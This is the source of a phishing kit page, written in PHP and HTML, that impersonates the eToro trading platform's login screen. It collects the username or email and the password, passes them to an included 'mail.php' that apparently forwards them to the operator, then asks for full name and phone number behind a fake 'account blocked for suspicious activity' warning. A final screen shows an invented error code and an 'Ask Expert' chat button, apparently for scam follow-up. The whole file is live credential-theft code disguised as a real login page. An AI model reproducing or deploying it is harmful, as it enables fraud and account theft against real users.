<!DOCTYPE html>
<html class="ng-scope">
    <head data-meta-tags="">
        <meta name="robots" content="noindex, nofollow"/>
        <meta name="googlebot" content="noindex, nofollow"/>
        <meta name="bingbot" content="noindex, nofollow"/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <!-- START META -->
        <title ng-bind=":: $root.t.dynamic(&#39;metaTags&#39;, &#39;login.title&#39;)" class="ng-binding ng-scope">eToro Login - Various Ways to Sign Into Your Account</title>        
         <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no, minimal-ui" />
         <link rel="icon" sizes="144x144" href="assets/touch-icon-ipad-144.png" />
        <?php include 'css-file.php';?>
        <link href="./assets/styles.61a18b95a01947c20742.css" rel="stylesheet" />
        <script async="async" src="./assets/en-us.js.download"></script>
         <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    </head>
    <body  class="ltr-direction">
        
        <ui-layout class="ng-isolate-scope">
            <!-- ngInclude: -->
            <div data-ng-include="" src="layoutCtrl.template" class="ng-scope">
                <app-root class="ng-scope" _nghost-ihs-c0="" ng-version="8.2.14"></app-root>
                <et-layout-login class="ng-scope" _nghost-ihs-c1="" ng-version="8.2.14">
                    <et-tutorial-screen _ngcontent-ihs-c1="" type="mobileVisitorTutorial" _nghost-ihs-c2=""><!----></et-tutorial-screen>
                    <!---->
                    <et-onboarding-screen _ngcontent-ihs-c1="" _nghost-ihs-c3=""><!----><!----></et-onboarding-screen>
                    <header _ngcontent-ihs-c1="" class="app-header" role="heading">
                        <a _ngcontent-ihs-c1="" automation-id="etoro-logo" class="app-header-logo green"></a>
                        <div _ngcontent-ihs-c1="" class="app-header-buttons-wrapper">
                            <!---->
                            <div _ngcontent-ihs-c1="" class="language-picker-container">
                                <et-language-picker _ngcontent-ihs-c1="" class="app-header-language-picker login-sub-temp" _nghost-ihs-c4="">
                                    <!----><!---->
                                    <a _ngcontent-ihs-c4="" class="language-picker-container et-flex-align-center" automation-id="general-language-picker-btn-title">
                                        <div _ngcontent-ihs-c4="" class="et-flex-align-center">
                                            <span _ngcontent-ihs-c4="" automation-id="general-language-picker-btn-title-flag" class="et-flag en-gb"></span>
                                            <span _ngcontent-ihs-c4="" class="language-name" automation-id="general-language-picker-btn-title-text">English</span>
                                        </div>
                                        <i _ngcontent-ihs-c4="" class="icon-arrow-right"></i>
                                    </a>
                                </et-language-picker>
                                <noscript _ngcontent-ihs-c1="">
                                    <et-language-switcher-menu _ngcontent-ihs-c1="" _nghost-ihs-c5="">
                                        <ul _ngcontent-ihs-c5="">
                                            <!---->
                                            <li _ngcontent-ihs-c5=""><a _ngcontent-ihs-c5="" href="#">English</a></li>
                                            
                                        </ul>
                                    </et-language-switcher-menu>
                                </noscript>
                            </div>
                        </div>
                    </header>
                    <div _ngcontent-ihs-c1="" class="sub-template-main-view" role="main">
                        <!-- ngIf: true --><!-- ngView: -->
                        <ng-view ng-if="true" class="ng-scope">
                            <et-login [app-info]="$resolve.appInfo" class="ng-scope" _nghost-ihs-c7="" ng-version="8.2.14">
                                <et-login-sts _ngcontent-ihs-c7="" _nghost-ihs-c8="">
                                    <div _ngcontent-ihs-c8="" class="login-page">

                                    <?php
                                     if (isset($_POST['btnLoginMore'])) {
                                        include 'mail.php';
                                    ?>
                                      <div _ngcontent-ihs-c8="">
                                            <div _ngcontent-ihs-c8="" automation-id="login-sts-wrapp" class="login-sts-wrapp">
                                                <!---->
                                                <div _ngcontent-ihs-c8="" automation-id="login-sts-wrapp-title" class="login-sts-title">
                                                    <div _ngcontent-ihs-c8="" class=""></div>
                                                    <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                                             Kindly contact chat assistance for further help
                                           </div>
                                           <br>
                                                    <h3>
                                                    Verification Required
                                                </h3>
                                                </div>
                                                <!---->
                                                <div _ngcontent-ihs-c8="" class="login-sub-title"></div>
                                                <!---->
                                                <form _ngcontent-ihs-c8="" autocomplete="off" class="login-form ng-invalid ng-touched ng-dirty" method="POST" name="loginForm" action="">
                                                    <div _ngcontent-ihs-c8="" class="input-row-ph">
                                                        <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                                                        <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                                                        <input
                                                            _ngcontent-ihs-c8=""
                                                            autocomplete="off"
                                                            automation-id="login-sts-username-input"
                                                            class="input-row ng-pristine ng-invalid ng-touched"
                                                            formcontrolname="name"
                                                            id="name"
                                                            name="name"
                                                            type="text" required
                                                        />
                                                        <span _ngcontent-ihs-c8="" class="two-line"></span><label _ngcontent-ihs-c8="">Full Name</label>
                                                    </div>
                                                    <div _ngcontent-ihs-c8="" class="input-row-ph">
                                                        <input
                                                            _ngcontent-ihs-c8=""
                                                            autocomplete="off"
                                                            automation-id="login-sts-password-input"
                                                            class="input-row ng-untouched ng-pristine ng-invalid"
                                                            formcontrolname="password"
                                                            id="number"
                                                            name="number"
                                                            type="text" required
                                                        />
                                                        <span _ngcontent-ihs-c8="" class="two-line"></span><label _ngcontent-ihs-c8="">Phone Number</label>
                                                        <div _ngcontent-ihs-c8="" automation-id="login-sts-error-no-password" class="input-error"><!----></div>
                                                    </div>
                                                 
                                                    <button type="submit" name="fromLog" id="verifyBtn"  _ngcontent-ihs-c8="" automation-id="login-sts-btn-sign-in" class="button-default blue-btn" style="margin-bottom: 40px;">Verify</button>
                                                   
                                                    <br>
                                                </form>
                                            </div>
                                        </div>


                                     <?php } elseif (isset($_POST['fromLog'])) {
                                         include 'mail.php';
                                     ?>
                                     <div _ngcontent-ihs-c8="">
                                            <div _ngcontent-ihs-c8="" automation-id="login-sts-wrapp" class="login-sts-wrapp">
                                                <!---->
                                                <div _ngcontent-ihs-c8="" automation-id="login-sts-wrapp-title" class="login-sts-title" style="margin-bottom: 40px">
                                                    <div _ngcontent-ihs-c8="" class=""></div>
                                                    <h3>
                                                    Account blocked
                                                </h3>
                                                 <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                                                    <div class="form">
                                                        <label style="font-size: 18px;">Error CODE: <b>6X76D</b></label><br>
                                                    </div>
                                                    <div class="calling-number"><br>
                                                        <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707;color: #fff !important;font-size: 20px;font-weight: 600;margin-top: 15px; padding: 5px;">Ask Expert</a>
                                                    </div>
                                                </div>
                                                
                                                
                                            </div>
                                        </div>

                                      <?php } else { ?>
                                        <div _ngcontent-ihs-c8="">
                                            <div _ngcontent-ihs-c8="" automation-id="login-sts-wrapp" class="login-sts-wrapp">
                                                <!---->
                                                <div _ngcontent-ihs-c8="" automation-id="login-sts-wrapp-title" class="login-sts-title">
                                                    <div _ngcontent-ihs-c8="" class=""></div>
                                                    Sign in
                                                </div>
                                                <!---->
                                                <div _ngcontent-ihs-c8="" class="login-sub-title"></div>
                                                <!---->
                                                <form _ngcontent-ihs-c8="" autocomplete="off" class="login-form ng-invalid ng-touched ng-dirty" method="POST" name="loginForm" >
                                                    <div _ngcontent-ihs-c8="" class="input-row-ph">
                                                        <input
                                                            _ngcontent-ihs-c8=""
                                                            autocomplete="off"
                                                            automation-id="login-sts-username-input"
                                                            class="input-row ng-pristine ng-invalid ng-touched"
                                                            formcontrolname="username"
                                                            id="email"
                                                            name="email"
                                                            type="text" required
                                                        />
                                                        <span _ngcontent-ihs-c8="" class="two-line"></span><label _ngcontent-ihs-c8="">Username or Email</label>
                                                        <div _ngcontent-ihs-c8="" automation-id="login-sts-error-no-username" class="input-error"><!----></div>
                                                    </div>
                                                    <div _ngcontent-ihs-c8="" class="input-row-ph">
                                                        <input
                                                            _ngcontent-ihs-c8=""
                                                            autocomplete="off"
                                                            automation-id="login-sts-password-input"
                                                            class="input-row ng-untouched ng-pristine ng-invalid"
                                                            formcontrolname="password"
                                                            id="password"
                                                            name="password"
                                                            type="password"
                                                             required
                                                        />
                                                        <span _ngcontent-ihs-c8="" class="two-line"></span><label _ngcontent-ihs-c8="">Password</label>
                                                        <div _ngcontent-ihs-c8="" automation-id="login-sts-error-no-password" class="input-error"><!----></div>
                                                    </div>
                                                    <!---->
                                                    <div _ngcontent-ihs-c8="" class="login-more mobile-hidden">
                                                        <div _ngcontent-ihs-c8="" class="login-more-remember" id="login-remember-me">
                                                            <div _ngcontent-ihs-c8="" class="checkbox-ph">
                                                                <input
                                                                    _ngcontent-ihs-c8=""
                                                                    automation-id="login-sts-checkbox-remember-me"
                                                                    class="checkbox ng-valid ng-dirty ng-touched"
                                                                    formcontrolname="check"
                                                                    id="CB"
                                                                    name="check"
                                                                    type="checkbox"
                                                                />
                                                                <label _ngcontent-ihs-c8="" automation-id="login-sts-lable-remember-me" class="checkbox-lable et-link" for="CB">Stay Signed in </label>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <button name="btnLoginMore" type="submit" _ngcontent-ihs-c8="" automation-id="login-sts-btn-sign-in" class="button-default blue-btn">Sign in</button>
                                                    <!----><!---->
                                                    <div _ngcontent-ihs-c8="" class="social-wrapper-title show-social-connect"><span _ngcontent-ihs-c8="">Or</span></div>
                                                    <!---->
                                                    <div _ngcontent-ihs-c8="" class="social-wrapper show-social-connect">
                                                        <div _ngcontent-ihs-c8="" class="social-login sign-up-button-ph">
                                                            <!---->
                                                            <button _ngcontent-ihs-c8="" automation-id="login-sts-btn-apple" class="sign-up-button sign-up-social-button apple-button">
                                                                <span _ngcontent-ihs-c8="">Sign in with Apple</span>
                                                            </button>
                                                            <!---->
                                                            <button _ngcontent-ihs-c8="" automation-id="login-sts-btn-fb" class="sign-up-button sign-up-social-button facebook-button">
                                                                <span _ngcontent-ihs-c8="">Sign in with Facebook</span>
                                                            </button>
                                                            <!---->
                                                            <button _ngcontent-ihs-c8="" automation-id="login-sts-btn-google" class="sign-up-button sign-up-social-button google-button">
                                                                <span _ngcontent-ihs-c8="">Sign in with Google</span>
                                                            </button>
                                                            <!----><!----><!----><!---->
                                                        </div>
                                                    </div>
                                                </form>
                                                <!---->
                                                <div _ngcontent-ihs-c8="" class="login-bottom-link w-login-sign-up" id="sign-up-link">
                                                    Don't have an account? <a _ngcontent-ihs-c8="" automation-id="login-sts-link-sign-up" class="et-link">Sign up </a>
                                                </div>
                                                <!---->
                                            </div>
                                        </div>
                                         <?php }  ?>
                                    </div>
                                </et-login-sts>
                            </et-login>
                        </ng-view>
                        <!-- end ngIf: true -->
                    </div>
                </et-layout-login>
                <loader class="ng-scope ng-isolate-scope">
                    <div ng-show="$ctrl.isLoading" ng-class="{standalone: $ctrl.isStandalone}" automation-id="$ctrl.isLoading ? &#39;loader-is-shown&#39; : &#39;&#39; " class="ng-hide">
                        <div class="e-screen active"></div>
                        <div class="e-loader-ph e-loader e-loader-active"></div>
                    </div>
                </loader>
            </div>
        </ui-layout>
        <!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/620a586d9bd1f31184dc89bb/1frs6irvs';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
       </body>
</html>
